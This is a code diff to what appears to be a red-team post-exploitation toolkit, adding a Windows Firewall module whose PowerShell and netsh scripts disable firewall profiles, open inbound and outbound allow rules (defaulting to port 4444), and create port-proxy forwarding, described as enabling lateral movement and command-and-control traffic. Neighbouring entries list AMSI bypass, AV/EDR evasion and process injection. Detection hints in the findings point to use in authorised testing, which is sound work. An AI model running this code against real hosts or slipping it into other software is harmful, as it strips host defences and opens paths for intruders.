@@ -487,6 +487,11 @@ const PROGRAMS = {
       "Verify stealth encoding modes are working — runs a benign test command through each encoding mode (plain, base64, amsi-bypass, obfuscate) and reports which ones execute successfully. Use before real operations to confirm AV/EDR evasion readiness",
     args: "[--mode base64|amsi|obfuscate|all]",
   },
+  firewall_manage: {
+    description:
+      "Windows Firewall manipulation — enumerate firewall profiles and rules, disable specific profiles (Domain/Private/Public), add allow rules for inbound/outbound connections, create port forwarding rules, find and disable blocking rules, and restore firewall to previous state. Essential for enabling lateral movement and C2 communication through host-based firewall",
+    args: "--action enum|disable|allow|forward|restore [--profile domain|private|public|all] [--port PORT] [--protocol tcp|udp] [--address IP] [--name RULE_NAME]",
+  },
   local_recon: {
     description:
       "Local environment reconnaissance — enumerate installed software, running services, AV/EDR product detection (Defender, CrowdStrike, SentinelOne, Carbon Black, Sophos, Cylance, Trend Micro, ESET, McAfee, Symantec, Palo Alto Cortex), security tools, .NET versions, PowerShell versions, hotfixes, network interfaces, firewall profiles, and attack surface mapping. Identifies defensive products before choosing evasion strategy",
@@ -13870,6 +13875,254 @@ async function stealthCheck(args: string[], timeout: number): Promise<HookResult
   return { output: output.join("\n"), findings }
 }
 
+async function firewallManage(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const profile = argVal(args, "--profile") || "all"
+  const port = argVal(args, "--port")
+  const protocol = argVal(args, "--protocol") || "tcp"
+  const address = argVal(args, "--address")
+  const ruleName = argVal(args, "--name")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Windows Firewall management...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Firewall Profile Status ==="
+$profiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue
+
+foreach ($p in $profiles) {
+    $status = if ($p.Enabled) { '[ENABLED]' } else { '[DISABLED]' }
+    Write-Output ""
+    Write-Output "[$($p.Name)] $status"
+    Write-Output "    Default Inbound: $($p.DefaultInboundAction)"
+    Write-Output "    Default Outbound: $($p.DefaultOutboundAction)"
+    Write-Output "    Log Allowed: $($p.LogAllowed)"
+    Write-Output "    Log Blocked: $($p.LogBlocked)"
+    Write-Output "    Log File: $($p.LogFileName)"
+    Write-Output "    Notification: $($p.NotifyOnListen)"
+}
+
+Write-Output ""
+Write-Output "=== Inbound Allow Rules (Active) ==="
+$inbound = Get-NetFirewallRule -Direction Inbound -Action Allow -Enabled True -ErrorAction SilentlyContinue |
+    Select-Object -First 30
+
+foreach ($r in $inbound) {
+    $portFilter = Get-NetFirewallPortFilter -AssociatedNetFirewallRule $r -ErrorAction SilentlyContinue
+    $ports = if ($portFilter.LocalPort -eq 'Any') { '*' } else { $portFilter.LocalPort -join ',' }
+    Write-Output "    $($r.DisplayName) | $($portFilter.Protocol)/$ports | Profile: $($r.Profile)"
+}
+
+Write-Output ""
+Write-Output "=== Suspicious/Custom Rules ==="
+$custom = Get-NetFirewallRule -Enabled True -ErrorAction SilentlyContinue |
+    Where-Object { $_.DisplayGroup -eq '' -or $_.DisplayGroup -eq $null } |
+    Select-Object -First 20
+
+foreach ($r in $custom) {
+    $portFilter = Get-NetFirewallPortFilter -AssociatedNetFirewallRule $r -ErrorAction SilentlyContinue
+    Write-Output "    [$($r.Direction)] $($r.DisplayName) | Action: $($r.Action) | $($portFilter.Protocol)/$($portFilter.LocalPort)"
+}
+
+Write-Output ""
+Write-Output "[*] Total rules: $((Get-NetFirewallRule -ErrorAction SilentlyContinue).Count)"
+Write-Output "[*] Enabled rules: $((Get-NetFirewallRule -Enabled True -ErrorAction SilentlyContinue).Count)"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-FW-001",
+      provider: "windows",
+      severity: "info",
+      status: "ENUMERATED",
+      resource: "firewall://profiles",
+      title: "Firewall profiles, rules, and configuration enumerated",
+      details: r.stdout.substring(0, 500),
+      remediation: "Ensure all profiles are enabled with default-deny inbound. Audit custom rules regularly.",
+    })
+  }
+
+  if (action === "disable") {
+    const profiles = profile === "all" ? "Domain,Private,Public" : profile
+    const script = `
+Write-Output "=== Disabling Firewall Profiles ==="
+$targetProfiles = '${profiles}' -split ','
+
+foreach ($p in $targetProfiles) {
+    $p = $p.Trim()
+    try {
+        $current = Get-NetFirewallProfile -Name $p -ErrorAction Stop
+        Write-Output "[*] $p — current state: $(if ($current.Enabled) { 'ENABLED' } else { 'DISABLED' })"
+
+        if ($current.Enabled) {
+            Set-NetFirewallProfile -Name $p -Enabled False -ErrorAction Stop
+            Write-Output "[+] $p profile DISABLED"
+        } else {
+            Write-Output "[*] $p already disabled"
+        }
+    } catch {
+        Write-Output "[-] Failed to disable $p — $($_.Exception.Message)"
+    }
+}
+
+Write-Output ""
+Write-Output "[!] Firewall profiles disabled — restore with: winhook firewall_manage --action restore"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-FW-002",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: `firewall://profiles/${profiles}`,
+      title: `Firewall profile(s) disabled: ${profiles}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor Event ID 2003 (firewall profile changed). Alert on profile disable events.",
+    })
+  }
+
+  if (action === "allow") {
+    const targetPort = port || "4444"
+    const name = ruleName || `CS-Allow-${protocol.toUpperCase()}-${targetPort}`
+    const addrFilter = address ? `-RemoteAddress '${address}'` : ""
+    const script = `
+Write-Output "=== Adding Firewall Allow Rule ==="
+Write-Output "[*] Rule: ${name}"
+Write-Output "[*] Port: ${targetPort}/${protocol}"
+Write-Output "[*] Address filter: ${address || "Any"}"
+Write-Output ""
+
+try {
+    New-NetFirewallRule -DisplayName '${name}' \`
+        -Direction Inbound \`
+        -Action Allow \`
+        -Protocol ${protocol.toUpperCase()} \`
+        -LocalPort ${targetPort} \`
+        ${addrFilter} \`
+        -Profile Any \`
+        -ErrorAction Stop | Out-Null
+
+    Write-Output "[+] Inbound allow rule created: ${name}"
+
+    New-NetFirewallRule -DisplayName '${name}-Out' \`
+        -Direction Outbound \`
+        -Action Allow \`
+        -Protocol ${protocol.toUpperCase()} \`
+        -RemotePort ${targetPort} \`
+        ${addrFilter} \`
+        -Profile Any \`
+        -ErrorAction Stop | Out-Null
+
+    Write-Output "[+] Outbound allow rule created: ${name}-Out"
+    Write-Output ""
+    Write-Output "[*] Cleanup: Remove-NetFirewallRule -DisplayName '${name}'"
+} catch {
+    Write-Output "[-] Failed: $($_.Exception.Message)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-FW-003",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: `firewall://rule/${name}`,
+      title: `Firewall allow rule created for ${protocol.toUpperCase()}/${targetPort}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor Event ID 2004 (rule added). Audit firewall rules for unauthorized entries.",
+    })
+  }
+
+  if (action === "forward") {
+    const listenPort = port || "8080"
+    const targetAddr = address || "10.0.0.1"
+    const targetPort = argVal(args, "--to-port") || listenPort
+    const script = `
+Write-Output "=== Port Forwarding ==="
+Write-Output "[*] Listen: 0.0.0.0:${listenPort}"
+Write-Output "[*] Forward to: ${targetAddr}:${targetPort}"
+Write-Output ""
+
+try {
+    netsh interface portproxy add v4tov4 listenport=${listenPort} listenaddress=0.0.0.0 connectport=${targetPort} connectaddress=${targetAddr}
+    Write-Output "[+] Port forwarding rule added"
+    Write-Output ""
+    Write-Output "[*] Current port proxy rules:"
+    netsh interface portproxy show v4tov4
+    Write-Output ""
+    Write-Output "[*] Cleanup: netsh interface portproxy delete v4tov4 listenport=${listenPort} listenaddress=0.0.0.0"
+} catch {
+    Write-Output "[-] Failed: $($_.Exception.Message)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-FW-004",
+      provider: "windows",
+      severity: "high",
+      status: "EXECUTED",
+      resource: `firewall://portproxy/${listenPort}`,
+      title: `Port forwarding: 0.0.0.0:${listenPort} -> ${targetAddr}:${targetPort}`,
+      details: r.stdout.substring(0, 500),
+      remediation: "Monitor netsh portproxy commands. Audit portproxy rules with 'netsh interface portproxy show all'.",
+    })
+  }
+
+  if (action === "restore") {
+    const script = `
+Write-Output "=== Restoring Firewall ==="
+
+Write-Output "[*] Enabling all firewall profiles..."
+Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled True -ErrorAction SilentlyContinue
+Write-Output "[+] All profiles enabled"
+
+Write-Output ""
+Write-Output "[*] Removing CyberStrike firewall rules..."
+$csRules = Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object { $_.DisplayName -match '^CS-' }
+$removed = 0
+foreach ($r in $csRules) {
+    Remove-NetFirewallRule -Name $r.Name -ErrorAction SilentlyContinue
+    Write-Output "[+] Removed: $($r.DisplayName)"
+    $removed++
+}
+Write-Output "[*] Removed $removed CyberStrike rules"
+
+Write-Output ""
+Write-Output "[*] Clearing port proxy rules..."
+netsh interface portproxy reset
+Write-Output "[+] Port proxy rules cleared"
+
+Write-Output ""
+Write-Output "[*] Current firewall status:"
+Get-NetFirewallProfile | ForEach-Object {
+    Write-Output "    $($_.Name): $(if ($_.Enabled) { 'ENABLED' } else { 'DISABLED' })"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-FW-005",
+      provider: "windows",
+      severity: "info",
+      status: "RESTORED",
+      resource: "firewall://restore",
+      title: "Firewall profiles restored, CyberStrike rules removed, port proxies cleared",
+      details: r.stdout.substring(0, 500),
+      remediation: "Verify firewall state matches organizational baseline after restoration.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function localRecon(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "full"
   const findings: Finding[] = []
@@ -18865,6 +19118,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   backup_operator_abuse: backupOperatorAbuse,
   applocker_bypass: applockerBypass,
   stealth_check: stealthCheck,
+  firewall_manage: firewallManage,
   local_recon: localRecon,
   ps_downgrade: psDowngrade,
   process_inject: processInject,
